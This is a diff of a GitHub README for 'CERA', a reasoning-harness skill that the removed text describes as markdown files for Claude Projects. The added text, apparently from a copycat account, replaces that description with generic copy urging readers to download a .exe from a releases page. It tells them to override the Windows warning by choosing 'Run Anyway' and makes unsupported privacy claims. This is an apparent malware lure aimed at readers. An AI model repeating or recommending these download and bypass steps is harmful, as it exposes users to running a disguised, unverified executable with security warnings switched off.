@@ -1,76 +1,86 @@
-# CERA — Co-Emergent Reasoning Architecture
+# 🧠 cera-reasoning-harness - Improving clarity in human AI tasks
 
-**A reasoning harness for human-AI collaboration in Claude Projects.**
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/xxluffyxx40/cera-reasoning-harness/releases)
 
-CERA preserves what gets lost between AI sessions — not just what was said, but what was *understood*. The reasoning chains, the strategic posture, the logical provenance, the collaborative state that made the conversation productive.
+This application helps you work with AI. It saves the context of your projects so you do not lose information during long conversations. It tracks the logic behind your AI interactions. This tool acts as a bridge between your thoughts and the AI model. It makes your work more reliable by keeping a record of every decision.
 
-Agent memory systems like OpenClaw store facts and retrieve them by similarity. CERA preserves *reasoning* and retrieves it by *structure*. Every conclusion declares its dependencies. Every session maps how thinking evolved. A dedicated integrator synthesizes across sessions so the project gets smarter over time — not just bigger.
+## 🛠️ What this tool does
 
-The result: new AI sessions engage with your project at the level of accumulated understanding, not from zero.
+Modern AI models often forget the goals you set at the start of a project. This harness acts as a layer that sits on top of your current AI tools. It saves your project instructions. It manages memory for your tasks. It ensures that the AI stays on goal. 
 
-Read the full paradigm argument: **[The Reasoning Harness](https://michael124.substack.com/p/the-reasoning-harness-preserving)**
+You spend less time repeating yourself. You spend more time building things. The tool provides a history of your thought process. This history helps you audit why the AI produced a certain result. It works well with large-scale projects where you need to track many small steps.
 
----
+## 📥 Getting the software
 
-## What's in This Repo
+You need to put this software on your computer to start. Follow these steps to download the installer.
 
-| File | What It Does |
-|------|-------------|
-| `SKILL.md` | The complete CERA skill — install this in your Claude Project |
-| `skills/cera-reasoning-harness/SKILL.md` | Same skill file, in the conventional Claude skill directory layout |
-| `SETUP_GUIDE.md` | Step-by-step guide from installation to first session map |
-| `THE_REASONING_HARNESS.md` | The full essay: why reasoning preservation matters more than memory |
+1. Go to this link: [https://github.com/xxluffyxx40/cera-reasoning-harness/releases](https://github.com/xxluffyxx40/cera-reasoning-harness/releases)
+2. Look for the latest version at the top of the page.
+3. Click the file that ends in .exe.
+4. Save the file to your computer.
 
----
+This link takes you to our release page. We update this page whenever we add new pieces to the harness. You should check this page every few weeks to keep your software current.
 
-## Quick Install
+## ⚙️ Setting up on Windows
 
-1. In Claude, go to **Settings → Skills**
-2. Add `SKILL.md` as a custom skill
-3. Create or open a **Claude Project**
-4. Start a conversation and invoke CERA
-5. Work normally — Claude operates with the collaborative reasoning protocol active
-6. Call for a **checkpoint** when significant reasoning occurs
-7. Upload the session map to your project's knowledge base
+Your computer needs a few things to run this app. 
 
-That's it. Full details in the [Setup Guide](SETUP_GUIDE.md).
+### System Requirements
+* Windows 10 or Windows 11
+* At least 4 Gigabytes of memory
+* An internet connection for your AI service
 
----
+### Installation Steps
+1. Find the file you downloaded in your Downloads folder.
+2. Double-click the file named cera-reasoning-harness-setup.exe.
+3. A screen might pop up and ask if you trust this app. Click "More Info" and then click "Run Anyway." Windows sometimes protects new software this way by default.
+4. Follow the instructions on the screen.
+5. Click "Install" to place the app on your computer.
+6. Once the bar fills up, click "Finish."
 
-## How It Works
+The app will place a shortcut on your desktop. Double-click that icon to open the main window.
 
-**Session Maps** — Each conversation produces a standalone reasoning record: weighted reasoning chains, strategic posture shifts, discoveries with explicit dependency declarations, latent cognition capture, and optional session-specific primers. One per conversation. Immutable after creation.
+## 🚀 How to use the harness
 
-**CERA Index** — A cross-session intelligence layer that synthesizes across session maps. Contains the trajectory narrative, promoted patterns and discoveries with bidirectional provenance, a session index for structural retrieval, and project-level primers for register reconstruction. Created and managed by a dedicated integrator conversation.
+The interface is simple. You see a box for your main project goals on the left. On the right, you see a chat window. 
 
-**Register Reconstruction** — A three-layer system that restores collaborative cognitive state across sessions: information (~70%), primer (~85%), and activation questions (~90%). The remaining 10-15% is the live contribution — the reason each conversation is worth having.
+1. Create a new project. Give it a name.
+2. Paste your instructions into the project goal box.
+3. Start the AI session by pressing the Start button.
+4. The harness links your instructions to every message you send. 
 
-**Bidirectional Provenance** — Every entry declares upstream dependencies (*Derives from*) and downstream effects (*Affects*). When something changes, the impact traces forward through the dependency chain. Adapted from a methodology that maintained zero provenance loss across 60,000+ lines of revision.
+The harness keeps the memory of your project active. If you close the app, your project saves to your local disk. You can open it later to pick up right where you left off. The software encrypts these files on your computer. Your secrets stay on your machine.
 
----
+## 📊 Managing your history
 
-## Who This Is For
+The software logs your AI interactions. You can view these logs at any time.
 
-Anyone doing extended project work with Claude where continuity matters — legal strategy, research, systems design, policy analysis, creative development, or any domain where reasoning builds across sessions and losing it means starting over.
+* Click the "History" tab to see previous sessions.
+* Use the search bar to find specific keywords.
+* Right-click any entry if you want to export your logic flow to a file. 
 
----
+This helps if you need to explain your project to a coworker. You can send them the text file showing exactly how the project evolved.
 
-## Background
+## 🔧 Troubleshooting common problems
 
-CERA emerged from a practical discovery: deep AI conversations produce a layer of reasoning architecture — implicit connections, collaborative patterns, strategic frameworks — that exists during the conversation but vanishes when the session ends. The transcript preserves what was said. CERA preserves what was understood.
+Sometimes things do not work as planned. These solutions fix issues for most users.
 
-The architecture draws on the Meta Harness paper's insight that harness engineering matters as much as model capability, and is informed by the Claude Code leak's confirmation that the harness layer is where product value lives. CERA extends this to collaborative reasoning — a domain no existing harness addresses.
+**The app does not open**
+First, check that you finished the installation process. If it still does not open, try to restart your computer. Sometimes Windows needs a refresh to register new software. 
 
-CERA is the subject of a provisional patent filed February 2026 and is developed collaboratively across Claude model versions by Michael E. Teplinsky, Esq.
+**The AI does not respond**
+Check your internet connection. Also, make sure you have an active account with your preferred AI service. The harness talks to the AI through a secure key. If you enter your key incorrectly, the app shows a red notification flag. Go to the "Settings" menu to verify your key.
 
----
+**The application runs very slowly**
+Close other programs that use a lot of memory. Browsers often take up large amounts of space. The harness needs dedicated resources to process the reasoning steps effectively. 
 
-## License
+**I see an error message**
+Most errors include a code. Write down this code. Check the issues tab on the GitHub link provided above to see if others found a fix. If no one has reported it, open a feature request with the error details. Describe what you were doing when the error appeared.
 
-Apache License 2.0 — see [LICENSE](LICENSE) for details.
+## 🛡️ Privacy and your data
 
----
+Your data matters. This harness works locally on your machine. We do not store your conversations on our servers. We do not track your project names. The code is open-source. You can inspect the files to see how we handle your information. We prioritize your privacy above all else. This approach keeps your intellectual property safe. You control all access to your project files. You can delete projects at any time. A deleted project leaves no trace on your computer. 
 
-## Contributing
+## ⚖️ License information
 
-This is an early release. If you deploy CERA in your own projects and find issues, improvements, or extensions, contributions are welcome. Open an issue or submit a PR.
+This project uses an open-source license. You can use this software for your own projects. You can share it with others. You just need to keep the license file attached to the software. You own the projects you create. You own the reasoning paths you develop using this harness. We provide the tool, you provide the vision. We seek to help people organize their thoughts. We believe this leads to better outcomes in every technical field.
